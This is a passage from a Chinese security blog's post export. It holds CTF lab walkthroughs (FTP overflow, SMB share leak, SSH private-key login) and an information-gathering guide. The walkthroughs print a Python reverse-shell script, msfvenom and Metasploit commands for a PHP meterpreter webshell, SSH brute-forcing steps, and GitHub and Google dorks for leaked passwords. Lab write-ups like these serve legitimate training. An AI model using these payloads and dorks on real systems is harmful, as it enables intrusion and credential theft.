<p>进行远程溢出<br>-exploit<br><img src="/images/ftp/ftp7.png" alt=""><br><img src="/images/ftp/ftp8.png" alt=""></p>
<p>执行命令<br>id<br><img src="/images/ftp/ftp9.png" alt=""></p>
<p><strong>4、优化shell使用</strong><br>python pty开启终端</p>
<pre><code>python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</code></pre><p><img src="/images/ftp/ftp10.png" alt=""></p>
<p><strong>5、获取Flag</strong><br>一般情况下，靶场机器的lag值是存放在服务器的根目录下，/root/目录。<br>cd/root/<br>Is<br>cat flag<br>writeup 测试文档 总结文档<br><img src="/images/ftp/ftp10.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞代码；<br>对于系统，一定要注意利用现成的EXP来root主机；</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>FTP远程溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SMB信息泄露</title>
    <url>/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h2 id="一、SMB介绍"><a href="#一、SMB介绍" class="headerlink" title="一、SMB介绍"></a>一、SMB介绍</h2><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。<a id="more"></a></p>
<p>SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445</p>
<p>SMB协议，计算机可以访问网络资源，下载对应的资源文件</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.137<br>目的：获取靶场机器的flag值</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测：</strong></p>
<ul>
<li>nmap -sV IP        挖掘开放服务信息<br><img src="/images/smb/smb1.png" alt=""></li>
<li>nmap -A -v -T4 IP  挖掘靶场全部信息<br><img src="/images/smb/smb2.png" alt=""><br><img src="/images/smb/smb3.png" alt=""></li>
</ul>
<p><strong>2、 针对SMB协议弱点分析</strong><br><em>1.针对SMB协义，使用空口令，若口令尝试登陆，并查看敏感卡载查看；</em></p>
<ul>
<li><p>smbclient -L IP<br><img src="/images/smb/smb4.png" alt=""></p>
</li>
<li><p>smbclient \‘IP\share$’<br>尝试登陆上面的sharename结果share可以用空密码进去，并且存在敏感文件<br><img src="/images/smb/smb5.png" alt=""></p>
</li>
<li><p>get 敏感文件<br><img src="/images/smb/smb6.png" alt=""><br>进一步嗅探<br><img src="/images/smb/smb7.png" alt=""><br>果然有发现<br><img src="/images/smb/smb8.png" alt=""><br>尝试登陆数据库<br><img src="/images/smb/smb9.png" alt=""><br>登陆失败！！！</p>
</li>
</ul>
<p><em>2.针对SMB协议远程溢出漏洞进行分析；</em><br><img src="/images/smb/smb10.png" alt=""></p>
<ul>
<li>searchsploit samba 版本号<br><img src="/images/smb/smb11.png" alt=""></li>
</ul>
<p><strong>3、针对HTTP协议弱点分析</strong><br><em>1.浏览器查看网站；</em><br><img src="/images/smb/smb12.png" alt=""></p>
<p><em>2.使用dirb nikto探测；</em><br><img src="/images/smb/smb13.png" alt=""><br><img src="/images/smb/smb14.png" alt=""></p>
<p><em>3.寻找突破点，目标登录后台，上传webshell；</em></p>
<p><img src="/images/smb/smb18.png" alt=""></p>
<p> <strong>- 制作webshell</strong></p>
<p>msfvenom -p php/meterpreter/reverse_tcp -lhost=攻击机ip地址 Iport=4444 -f raw&gt;/root/Desktop/shell.php<br><img src="/images/smb/smb16.png" alt=""></p>
<p> <strong>- 启动监听</strong><br>msf&gt;use exploit/multi/handler<br>msf exploift（handler）&gt;set payload php/meterpreter/reverse_tcp<br>msf exploift（handler）&gt;set lhost 攻击机IP地址<br>msf exploit（handler）&gt;set lport 4444<br>msf exploit（handler）&gt;run</p>
<p> <strong>- 上传Webshell</strong><br>使用找到的敏感信息登录系统后台，上传webshell。执行<br>webshell（访问具有webshell的php页面）<br><img src="/images/smb/smb17.png" alt=""></p>
<p>wordpress 上传点theme 404.php<br>执行：http:/靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php<br><img src="/images/smb/smb19.png" alt=""></p>
<p>获得反弹的shell<br><img src="/images/smb/smb20.png" alt=""></p>
<p><strong>4、查找flag信息</strong><br>优化终端：</p>
<pre><code>python -c&quot;import pty;pty.spawn（&apos;/bin/bash&apos;）&quot;</code></pre><p><img src="/images/smb/smb21.png" alt=""></p>
<p>查找敏感信息，提升root权限，查看flag值。<br><img src="/images/smb/smb22.png" alt=""></p>
<p>查找用户名：cat/etc/passwd查找密码：在共享目录下的敏感文件，提升权限<br>–su用户名<br>–sudo -l<br>–su sudo<br><img src="/images/smb/smb23.png" alt=""><br><img src="/images/smb/smb24.png" alt=""><br><em>很幸运的使用弱密码登陆了进来了</em><br><img src="/images/smb/smb25.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件。<br>一般情况下lag值都在/root目录下，并且需要提升root权限才能查看内容；</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH私钥泄露CTF-SSH服务测试</title>
    <url>/2019/12/14/CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><p>攻击机：kali linux（192.168.43.153）NAT模式<br>靶机：born2root<a id="more"></a> 后面找机会把链接补上（192.168.0.6）桥接模式</p>
<h2 id="二、实验过程"><a href="#二、实验过程" class="headerlink" title="二、实验过程"></a>二、实验过程</h2><p>1、当我们拿到目标主机的ip地址先用zenmap进行端口扫描<br><img src="/images/s1.png" alt=""><br>发现开启了22端口和80端口，接下来首先对80端口进行探测</p>
<p>2、用dirb进行目录扫描发现<br><img src="/images/s2.png" alt=""><br><em>打开链接存在得到几个有用的信息</em></p>
<ul>
<li>可能作为ssh的登陆名<br><img src="/images/s3.png" alt=""></li>
<li>得到RSA的私钥<br><img src="/images/s4.png" alt=""></li>
</ul>
<p>3、用上面得到的rsa私钥和用户名尝试登陆<br><img src="/images/s5.png" alt=""><br>结果比较幸运的是用martin成功登陆了目标主机，不过只是一个普通的权限<br><img src="/images/s6.png" alt=""></p>
<p>4、接下来对得到的靶机进行扩大战果</p>
<ul>
<li><p>查看/home目录下的用户</p>
</li>
<li><p>查看/root目录是否存flag.txt</p>
</li>
<li><p>查看/tmp<br><img src="/images/s7.png" alt=""><br>发现了其他的用户，与之前判断的信息相符合</p>
</li>
<li><p>cat/etc/passwd  查看所有用户的列表cat/etc/group<br><img src="/images/s8.png" alt=""></p>
</li>
<li><p>挖掘/etc/crontab下是否有某个用户的定时计划文件<br><img src="/images/s9.png" alt=""><br>发现存在定时执行”.py”文件，但是/tmp里面呢并没有这个文件，于是我们尝试编写一个“反弹的shell”</p>
<p>sekurity.py里面的内容为：<br> #/usr/bin/python<br> import os,subprocess,socket<br> s=socket.socket()<br> s.connect(“攻击机ip地址”,”攻击机监听端口”)<br> os.dup2(s.fileno(),0)<br> os.dup2(s.fileno(),1)<br> os.dup2(s.fileno(),2)<br> p=subprocess.call([“/bin/sh”,”-i”])</p>
<p><img src="/images/s10.png" alt=""><br><em>开启监听</em><br>这里因为我的kali是用NAT，而靶机用的桥接模式，所以并没有收到反弹的shell</p>
</li>
</ul>
<p>6、尝试对hadi账户ssh进行暴力破解<br><em>pass_file文件的准备</em><br>使用cupp进行个性化的密码生成<br><img src="/images/s12.png" alt=""><br><img src="/images/s13.png" alt=""><br>生成后，我们会在其路径下有一个txt文件<br><img src="/images/s14.png" alt=""></p>
<p><em>使用msfconsole进行ssh登陆</em><br>使用对应的模块<br><img src="/images/s11.png" alt=""><br>设置参数<br><img src="/images/s15.png" alt=""><br>run<br><img src="/images/s16.png" alt=""><br>进入sessions<br><img src="/images/s17.png" alt=""><br>我们可以看到会话比较简陋<br>Python的模块进行优化<br><img src="/images/s19.png" alt=""><br>    python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
<p>7、成功提权拿到<strong>flag</strong><br><img src="/images/s18.png" alt=""></p>
<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p><strong>（1）、初步嗅探</strong></p>
<ul>
<li>nmap主机发现、端口扫描</li>
<li>目录扫描，查找敏感目录“‘robots.txt等”</li>
</ul>
<p><strong>（2）、扩大战果</strong><br>登录服务器之后，我们需要做以下操作。</p>
<ul>
<li>1、查看当前用户whoami </li>
<li>2、id查看当前用户的权限 </li>
<li>3、查看根目录寻找flag文件</li>
</ul>
<p>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组；</p>
<ul>
<li>cat/etc/passwd  查看所有用户的列表cat/etc/group</li>
<li>查看用户组 find/-user 用户名 </li>
<li>查看属于某些用户的文件 /tmp  查看缓冲文件目录</li>
</ul>
<p><strong>（3）、深入挖掘</strong><br>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要roo权限。<br>挖掘/etc/crontab下是否有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p>
<p><strong>（4）、具体思路</strong><br>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登录靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登录靶场机器。<br>CTF中要特别注意/tmp数据缓冲目录以及/etc/crontab设置定时执行的文件</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH私钥</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集_base1”</title>
    <url>/2019/11/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_base1/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>信息收集对于渗透测试整个过程来说是非常重要的，能否挖掘到漏洞很大一部分取决于信息的收集是否全面，只有想尽办法收集到更多信息，你挖掘到漏洞的可能性越大，<a id="more"></a>本文章主要对目前较为经典与流行的信息收集的一些手段进行总结。</p>
<h1 id="信息收集方法总结"><a href="#信息收集方法总结" class="headerlink" title="信息收集方法总结"></a>信息收集方法总结</h1><h2 id="whois和备案"><a href="#whois和备案" class="headerlink" title="whois和备案"></a>whois和备案</h2><p>1、使用各大whois网站查询<br><a href="https://whois.aliyun.com" target="_blank" rel="noopener">阿里云whois: https://whois.aliyun.com</a><br><a href="https://www.whois365.com/cn" target="_blank" rel="noopener">whois365: https://www.whois365.com/cn</a><br><a href="http://whois.chinaz.com" target="_blank" rel="noopener">站长之家: http://whois.chinaz.com</a><br><a href="https://www.whois.com/whois" target="_blank" rel="noopener">国外的whois: https://www.whois.com/whois</a></p>
<p><img src="/images/x2.png" alt=""></p>
<p>2、使用kali linux </p>
<pre><code>例如:whois qq.com</code></pre><p><img src="/images/x1.png" alt=""></p>
<p>3、备案信息查询<br>国内的网站如果通过whois网站没有查询到太多的信息，可以到备案查询，需要知道的是：国外网站是不需要备案的<br><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a><br><a href="http://beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://beian.miit.gov.cn/publish/query/indexFirst.action</a></p>
<p><img src="/images/x11.png" alt=""></p>
<p>通过收集到的特征信息 “**联系邮箱，联系电话，注册人，DNS解析服务器…，可以用于后面的后台密码破解、社工测试</p>
<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>1、子域名挖掘工具</p>
<pre><code>如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。</code></pre><p>这里推荐两款子域名挖掘的工具:</p>
<pre><code>subDomainsBrute和layer(windows端)</code></pre><p><img src="/images/x10.png" alt=""><br>简单的使用</p>
<pre><code>域名文件会保存到subDomainsBr的目录下，并且以域名命名</code></pre><p><img src="/images/x4.png" alt=""></p>
<p>2、搜索引擎挖掘如：<br>在Google中输入site:qq.com</p>
<pre><code>寻找url头带有index.php的链接</code></pre><p><img src="/images/x5.png" alt=""></p>
<p>寻找标题带有后台等敏感信息<br><img src="/images/x6.png" alt=""></p>
<p>上面介绍了两个比较常用的谷歌黑客语法，大家可以尝试更多不同语法和组合</p>
<p>3、第三方DNS数据集网站查询：</p>
<p><img src="/images/x8.png" alt=""></p>
<p><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a><br><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a><br><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a><br><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p>
<p>4、证书透明度公开日志枚举：</p>
<p><img src="/images/x12.png" alt=""></p>
<p><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br><a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></p>
<p>5、其他途径：</p>
<p><img src="/images/x13.png" alt=""></p>
<p><img src="/images/x20.png" alt=""></p>
<p><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a><br><a href="http://dns.aizhan.com" target="_blank" rel="noopener">http://dns.aizhan.com</a><br><a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p>
<p>Github主要是用来分享开源项目的社区，同样可以用Github来针对性的搜索子域名，二级域名，三级域名等等</p>
<p><img src="/images/x7.png" alt=""></p>
<h2 id="站点信息"><a href="#站点信息" class="headerlink" title="站点信息"></a>站点信息</h2><p>CMS识别工具：<br>1、在线工具 </p>
<p><img src="/images/x14.png" alt=""></p>
<p><a href="http://whatweb.bugscaner.com/look" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p>
<p>2、本地工具</p>
<pre><code>whatweb、御剑web指纹识别程序</code></pre><p><a href="https://pan.baidu.com/share/link?shareid=437376&uk=3526832374" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=437376&amp;uk=3526832374</a></p>
<pre><code>大禹CMS识别程序 </code></pre><p><a href="https://github.com/Ms0x0/Dayu" target="_blank" rel="noopener">https://github.com/Ms0x0/Dayu</a></p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>1、使用nmap探测。nmap -A -v -T4 tags</p>
<p><img src="/images/x9.png" alt=""></p>
<p>2、使用masscan探测。</p>
<p><img src="/images/x15.png" alt=""></p>
<p>3、使用在线网站探测<br><a href="http://tool.chinaz.com/port/" target="_blank" rel="noopener">http://tool.chinaz.com/port/</a></p>
<pre><code>常见端口服务以及入侵方式:</code></pre><p><img src="/images/x21.png" alt=""></p>
<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>指的是利用搜索引擎搜索目标暴露在互联网上的关联信息。<br>例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息</p>
<p>1、Google hacking数据库：<br><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
<p>例如：查询Access数据：</p>
<pre><code>filetype:mdb &quot;standard jet&quot; (password | username | user | pass</code></pre><p>2、获取HTTP响应的方法：</p>
<pre><code>利用工具如：浏览器审计工具、Burpsuite等代理截断工具。</code></pre><p><img src="/images/x16.png" alt=""></p>
<pre><code>编写Python脚本requests库参考链接：</code></pre><p><a href="http://www.python-requests.org/en/master/" target="_blank" rel="noopener">http://www.python-requests.org/en/master/</a></p>
<pre><code>import requests 
r=requests.get（&apos;目标’）
print（r.headers）</code></pre><p>3、Github信息泄露</p>
<p><img src="/images/x17.png" alt=""></p>
<p>Github之邮件配置信息泄露：</p>
<pre><code>site:Github.com smtp
site:Github.com smtp@qq.com </code></pre><p>Github之数据库信息泄露：</p>
<pre><code>site:Github.com sa password
site:Github.com root password
site:Github.com User ID=&apos;sa&apos;；Password </code></pre><p>Github之svn信息泄露：</p>
<pre><code>site:Github.com svn
site:Github.com svn username </code></pre><p>Github之综合信息泄露：</p>
<pre><code>site:Github.com password
site:Github.com ftp ftppassword
site:Github.com 密码
site:Github.com内部</code></pre><h2 id="真实IP地址收集"><a href="#真实IP地址收集" class="headerlink" title="真实IP地址收集"></a>真实IP地址收集</h2><h3 id="cdn检测"><a href="#cdn检测" class="headerlink" title="cdn检测"></a>cdn检测</h3><p>1、通过ping是否存在CDN服务器 </p>
<pre><code>例如：ping www.baihe.com 会显示：dhntip</code></pre><p>2、通过在线ping测试 </p>
<pre><code>使用：ping.chinaz.com</code></pre><h3 id="绕过cdn"><a href="#绕过cdn" class="headerlink" title="绕过cdn"></a>绕过cdn</h3><p>如果没有使用cdn可以使用ping或者<a href="http://www.ip138.com直接查询" target="_blank" rel="noopener">www.ip138.com直接查询</a><br>如果目标使用CDN，需要绕过CDN来获取真实IP地址。</p>
<pre><code>1、内部邮箱源 收集到内部邮箱服务器IP地址
2、网站phpinfo文件 phpinfo.php
3、分站IP地址，查询子域名 CDN很贵，很有可能分站就不再使用CDN。
4、国外访问 &lt;https://asm.ca.com/en/ping.php&gt;
5、查询域名解析记录 &lt;https://viewdns.info/&gt;</code></pre><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><p>旁站：通俗来讲旁站指的是和目标web服务在同一个服务器的其他站点<br>c段：是和目标服务器ip处在同一个C段的其它服务器，通常大型的企业会买下整个c段<br>1、站长之家：<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a><br><img src="/images/x23.png" alt=""><br>2、利用Google，语法：site:192.168.0.*<br>3、利用Nmap 的 -open参数</p>
<pre><code>语法：nmap -p 80,8080 –open ip/24</code></pre><p>4、K8工具、御剑、北极熊扫描器等<br>5、在线：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><img src="/images/x22.png" alt=""></p>
<h2 id="waf识别"><a href="#waf识别" class="headerlink" title="waf识别"></a>waf识别</h2><h4 id="wafw00f用于WEB应用防火墙识别"><a href="#wafw00f用于WEB应用防火墙识别" class="headerlink" title="wafw00f用于WEB应用防火墙识别"></a>wafw00f用于WEB应用防火墙识别</h4><p>wafw00f -l 显示可以识别的waf<br>wafw00f <a href="http://www.microsoft.com" target="_blank" rel="noopener">http://www.microsoft.com</a><br><img src="/images.x24.png" alt=""></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap <a href="http://www.microsoft.com" target="_blank" rel="noopener">www.microsoft.com</a> <strong>–script=http-waf-detect.nse</strong></p>
<p><img src="/images.x25.png" alt=""></p>
<h3 id="发送恶意请求"><a href="#发送恶意请求" class="headerlink" title="发送恶意请求"></a>发送恶意请求</h3><pre><code>这种方式直接引起waf的机制
如图是**安全狗**的waf触发</code></pre><p><img src="/images.x26.png" alt=""></p>
<h2 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h2><h3 id="shodan介绍"><a href="#shodan介绍" class="headerlink" title="shodan介绍"></a>shodan介绍</h3><p><img src="/images/x18.png" alt=""><br><em>按照官网的介绍shodan是一个物联网的搜索引擎，可以搜索到公网上的一切设备，设备的端口，响应等等，shodan都帮你做了一次的扫描<br>*</em>仅限学习，请勿用于非法用途！**<br><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a></p>
<h3 id="shodan搜索技巧"><a href="#shodan搜索技巧" class="headerlink" title="shodan搜索技巧"></a>shodan搜索技巧</h3><p>在Explore搜索框中输入webcam进行搜索。<br>通过关键字 port 指定具体端口号。</p>
<pre><code>例如:port:22 指定搜索22号端口的主机信息。</code></pre><p><img src="/images/x19.png" alt=""></p>
<p>通过关键字 host指定具体IP地址。</p>
<pre><code>例如: host:61.135.169.121 指定探测IP地址主机信息。</code></pre><p>利用city:城市名指定搜索具体城市的内容。</p>
<pre><code>例如： city:hangzhou port:22</code></pre><h3 id="3、shodan命令行介绍"><a href="#3、shodan命令行介绍" class="headerlink" title="3、shodan命令行介绍"></a>3、shodan命令行介绍</h3><p>Shodan获取指定IP地址信息：</p>
<pre><code>shodan host ip地址</code></pre><p>Shodan获取账号信息：</p>
<pre><code>利用shodan info 查看自身账户的信息。</code></pre><p>Shodan获取自身外部IP地址：</p>
<pre><code>使用shodan myip</code></pre><p>Shodan检测是否有蜜罐：</p>
<pre><code>利用shodan honeyscore 查看是否有蜜罐保护。</code></pre><hr>
<p><em>写的不全面，望有好的操作望大佬指点指点，谢谢！</em><br><strong>本文属于@ayoung博客，未经许可禁止转载</strong></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
